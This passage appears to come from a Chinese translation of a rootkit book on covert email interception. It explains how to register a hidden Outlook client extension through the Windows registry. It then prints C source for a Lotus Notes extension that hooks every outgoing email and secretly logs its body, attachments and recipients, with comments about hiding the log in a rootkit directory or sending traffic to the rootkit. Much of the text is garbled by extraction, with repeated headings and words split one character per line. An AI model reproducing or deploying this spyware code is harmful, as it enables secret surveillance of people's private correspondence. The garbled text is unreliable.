switch (context)
{
case EECONTEXT_SENDNOTEMESSAGE:
case EECONTEXT_SENDPOSTMESSAGE:
case EECONTEXT_SENDRESENDMESSAGE:
return S_OK;
}
return S_FALSE;
}
// The sole purpose of ExchEntryPoint is to return a new instance
// of the Extension Interface to Outlook or Exchange.
LPEXCHEXT CALLBACK ExchEntryPoint()
{
return new CClientExtension;
}
这个 Outlook 客户端工程原来是用 Visual Studio 6.0 写的，所以当你使用一个比较新的
开发环境来打开这个工程时，可能会询问你是否要转换 OutlookExtension.dsw 为新版本的工
程文件，你可能还会看到有一些警告信息，特别是不推荐使用的 strcpy 和 fopen 函数在用
VIsual Studio 8.0 编译 OutlookExtension.cpp 时会产生一些警告，在使用一些比较新的开发环
境的时候，因为这些警告可以安全地忽略掉，而工程文件会自动转换，所以我们并没有为了
适应新的开发环境而去修改这个项目。
安装一个 Outlook
Outlook
Outlook
Outlook 客户端过滤器
Outlook 使用注册表项来控制客户端扩展附件。在初始化期间，Outlook 会检查些扩展
注册表项的一个特殊的值，如果找到了这个值，Outlook 会重新初始化客户端扩展表来附加
扩展项下指定的所有扩展。
Outlook
扩
展
的
注
册
表
项
是
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Exchange\ Client\Extensions。
用来重新初始化客户端扩展表的特殊值是 Outlook Setup Extension (这是一个字符串值)
Outlook Setup Extension 值的内容必须如下：
4.0;Outxxx.dll;7;000000000000000;0000000000;OutXXX
如果 Outlook 在扩展项里找到了这个值就会重新注册扩展项下指定的所有扩展。
客户端扩展注册表项必须指定成如下格式：
Value = 扩展的名称(这是一个字符串值)
Data = 4.0; 库文件的位置; 1;00100100001000;0001000
我们这里可以像下面这样指定：
MyClientExtension = 4.0;C:\OutlookExtension.dll;1;00100100001000;0001000
在重新注册了扩展项下指定的所有扩展后，Outlook 会删除 Outlook Setup Extension 这
个特殊的字符串值，然后会使用一个内部的客户端扩展表，直到一个新的特殊的扩展字符串
值存入扩展项里。
如果没有这个特殊的扩展字符串值 Outlook 是不会注册一个新的客户端扩展的，所以你
不能简单地添加一个定义了你的客户端扩展的字符串值。
测试 Outlook
Outlook
Outlook
Outlook 客户端扩展
一旦 OutlookExtension.dll 已经复制到了 C 盘根目录并且注册表已经声明了这个库为一
个客户端扩展，你就可以运行 Outlook 来开始发送一封电子邮件了，每封电子邮件消息都会
在 C:\OL_LOG 里产生一些条目信息，这是一个记录的例子：
DESTINATION(S):
/O=MSOFT/OU=FIRST ADMINISTRATIVE GROUP/CN=RECIPIENTS/CN=Jdoe
BODY:
test1
DESTINATION(S):
PI:EMAIL,PI:EMAIL,PI:EMAIL,/O= MSOFT/OU=FIRST ADMINISTRATIVE
GROUP/CN=RECIPIENTS/CN=Jdoe
BODY:
test 2
this test contains 4 recipients
1 local address and 3 Internet addresses
DESTINATION(S):
/O= MSOFT/OU=FIRST ADMINISTRATIVE GROUP/CN=RECIPIENTS/CN=Jdoe
BODY:
test 3
this test contains 2 attachments
ATTACHMENT:
this is the text of another attachment
ATTACHMENT:
this is the text of an attachment
Lotus
Lotus
Lotus
Lotus Notes
Notes
Notes
Notes 电子邮件的过滤
在 初 始 化 期 间 ， Lotus Notes 会 加 载 每 个 客 户 端 扩 展 DLL 并 调 用 其 导 出 函 数
MainEntryPoint。在 MainEntryPoint 里，一个 Lotus Notes 扩展可以通过注册来接收 100 多个
事件的通知，这些事件都定义在 Lotus Notes 的 C 言语 API（应用程序接口）文件 extmgr.h
里。
本章中所描述的客户端扩展主要用来接收 Lotus Notes 发送的每封电子邮件的预发送通
知消息。事件注册必须提供在事件被触发时被调用的导出函数的入口点。实际上的事件是
EM_MAILSENDNOTE + EM_REG_BEFORE。实际上被注册的用来当这个事件产生时被调
用的函数是 OnSendMail。
这个客户端扩展有 5 个实现文件和 46 个 Lotus 文件。
5555 个实现文件是如下::::
LotusExtension.c － 实现的源代码
LotusExtension.h － 实现文件的头文件
LotusExtension.def － DLL 导出函数定义文件
LotusExtension.mak － 工程生成文件
Readme.txt － 生成和操作说明
下面是 16
16
16
16 个 Lotus
Lotus
Lotus
Lotus 文件::::
lib\notes.lib
include\darray.h
include\extmgr.h
include\global.h
include\globerr.h
include\mail.h
include\mailserv.h
include\misc.h
include\nif.h
include\nls.h
include\nsfdata.h
include\nsferror.h
include\nsfnote.h
include\nsfstr.h
include\pool.h
include\stdnames.h
本章里不详细讲述 Lotus 里提供的文件，但是我还是建议大家看下 extmgr.h 这个文件，
这个文件会告诉你在 Lotus Notes 客户端扩展里可以包含的功能。
上面列出的 Lotus 文件只代表了 Lotus Notes C API 提供的文件的一个最小子集。完整的
API 包含了另外一些库文件且包含有多种目标环境。你可以从下面这个链接下载这个 API：
www-128.ibm.com/developerworks/lotus/downloads/toolkits.html
请确保你下载的是 Windows XP 和 2000 的 API，在下载前你必须要先进行注册，所以
要准备好你的个人信息。
LotusExtension.h
LotusExtension.h
LotusExtension.h
LotusExtension.h
// Copyright Ric Vieler, 2006
// Support header for LotusExtension.c
#ifndef _LOTUS_FILTER_H_
#define _LOTUS_FILTER_H_
// LOTUS C API FOR DOMINO AND NOTES HEADER FILES
#include 
#include 
#define DLL_EXPORT
// Data types for LogContent
#define BODY_FILENAME_CONTENT
1
#define ATTACHMENT_FILENAME_CONTENT 2
#define ADDRESS_STRING_CONTENT
3
/* File Managment Definitions */
#define LN_BODY "C:\\LN_Body"
#define LN_ATTACHMENT "C:\\LN_Attachment"
#define LN_LOG_FILE "C:\\LN_LOG"
#endif
LotusExtension.c
LotusExtension.c
LotusExtension.c
LotusExtension.c
LotusExtension.c 文件提供了 DLL 文件的实现代码。这个文件里有 10 个函数，这个文
件里的函数是以相反的顺序出现的，这样不用在头文件里声明就能让编译器分析出这此函数
的原型，所以从文件下面往上读这个文件能够更容易理解一点。
DllMain － 在库文件加载的时候系统由系统来调用
OnSendMail － 这是在每封电子邮件发送出去前被调用的函数
MainEntryPoint － 这是在加载了库文件后由 Lotus Notes 调用的函数
DeregisterEntry － 这个函数用来从预发送事件列表里移除 OnSendMail
RegisterEntry － 这个函数把 OnSendMail 插入到预发送事件列表里
Saverecipients － 用来分析接收到的消息然后把结果发磅到 LogContent
ParseRecipientList － 这个函数可以用来加入到多个目标列表里
SaveAttachments － 这个函数会把附件发送到 LogContent
SaveBody － 这个函数会把电子邮件的正文发送到 LogContect
LogContent － 这个函数用来记录一封电子邮件的正文、附件和目的地址
// LotusExtension
// Copyright Ric Vieler, 2006
// Filter Lotus Notes email
// Windows header files
#include 
#include 
// Lotus Notes header files
#include 
#include 
#include 
#include 
// Application specific header file
#include "LotusExtension.h"
// GLOBAL VARIABLES
EMHANDLER filterProcedure;
HEMREGISTRATION hHandler;
WORD recursionId;
// Copy email traffic to a storage directory
// (use RootkitDirectory if it is being hidden)
// or send email traffic to the rootkit.
void LogContent( char* content, int contentType )
{
// Put content into one big file for this example
BYTE buffer[ MAX_PATH ];
size_t contentLength;
FILE* sourceFile;
FILE* destinationFile;
// open the destination file - LN_LOG_FILE
strcpy( buffer, LN_LOG_FILE );
if( (destinationFile = fopen( buffer, "a+b" )) != NULL )
{
if( contentType == ADDRESS_STRING_CONTENT )
{
// content is a string
// write address header
fwrite( "DESTINATION(S):\n", sizeof(char), 16, destinationFile );
// write addresses
contentLength = strlen( content );
fwrite( content, sizeof( char ), contentLength, destinationFile );
// write address footer
fwrite( "\n\n", sizeof( char ), 2, destinationFile );
}
else
{
// content is a filename
if( (sourceFile = fopen( content, "r+b" )) != NULL )
{
// write header
if( contentType == BODY_FILENAME_CONTENT )
fwrite( "BODY:\n", sizeof(char), 6, destinationFile );
else
fwrite( "ATTACHMENT:\n", sizeof(char), 12, destinationFile );
// write attachment
do
{
contentLength = fread( buffer, sizeof(char), MAX_PATH, sourceFile );
if( contentLength )
{
fwrite( buffer, sizeof(char), contentLength, destinationFile );
}
} while( contentLength == MAX_PATH );
// write footer
fwrite( "\n", sizeof( char ), 1, destinationFile );
fclose( sourceFile );
}
}
fclose( destinationFile );
}
}
void SaveBody( HANDLE hNote )
{
STATUS errorStatus;
DWORD primaryFileSize;
char primaryFile[MAX_PATH];
// Construct temp file name
strcpy( primaryFile, LN_BODY );
// Put the body of the message into temp file.
errorStatus = MailGetMessageBodyText(hNote,
NULL,
"\r\n",
80,
TRUE,
primaryFile,
&primaryFileSize);
if ( !errorStatus
&& primaryFileSize > 0 )
LogContent( primaryFile, BODY_FILENAME_CONTENT );
}
void SaveAttachments( HANDLE hNote )
{
WORD attachment;
BLOCKID blockID;
char fileName[MAX_PATH + 1];
// Construct temp file name
strcpy( fileName, LN_ATTACHMENT );
// Open the attachment (if any)
for (attachment = 0;
MailGetMessageAttachmentInfo(
hNote,
attachment,
&blockID,
NULL,
NULL,
NULL,
NULL,
NULL,
NULL);
attachment++ )
{
//
extract the attachment
if( !MailExtractMessageAttachment(hNote, blockID, fileName) )
{
// log the attachment
LogContent( fileName, ATTACHMENT_FILENAME_CONTENT );
}
}
}
void ParseRecipientList( char* recipients, char* buffer, unsigned int* pIndex )
{
int length;
length = strlen( recipients );
memcpy( buffer + *pIndex, recipients, length );
*(buffer + *pIndex + length) = ',';
length++;
*pIndex += length;
}
BOOL SaveRecipients( HANDLE hNote )
{
WORD stringLength;
char string[MAXSPRINTF+1];
char addresses[(MAXSPRINTF*3)+3];
unsigned int addressesIndex = 0;
MailGetMessageItem (hNote, MAIL_BLINDCOPYTO_ITEM_NUM, string, MAXSPRINTF,
&stringLength);
if( strlen( string ) )
ParseRecipientList( string, addresses, &addressesIndex );
MailGetMessageItem (hNote, MAIL_COPYTO_ITEM_NUM, string, MAXSPRINTF,
&stringLength);
if( strlen( string ) )
ParseRecipientList( string, addresses, &addressesIndex );
MailGetMessageItem (hNote, MAIL_SENDTO_ITEM_NUM, string, MAXSPRINTF,
&stringLength);
if( strlen( string ) )
ParseRecipientList( string, addresses, &addressesIndex );
if( addressesIndex > 1 )
{
// Overwrite last comma with string terminator
addresses[addressesIndex-1] = 0;
// Log destination addresses
LogContent( addresses, ADDRESS_STRING_CONTENT );
return TRUE;
}
return FALSE;
}
// Register for EM_MAILSENDNOTE - EM_REG_BEFORE events
STATUS RegisterEntry()
{
STATUS error = NOERROR;
error = EMRegister(EM_MAILSENDNOTE,
EM_REG_BEFORE,
(EMHANDLER)filterProcedure,
recursionId,
&hHandler);
return(error);
}
// Deregister filterProcedure
STATUS DeregisterEntry()
{
STATUS error = NOERROR;
error = EMDeregister(hHandler);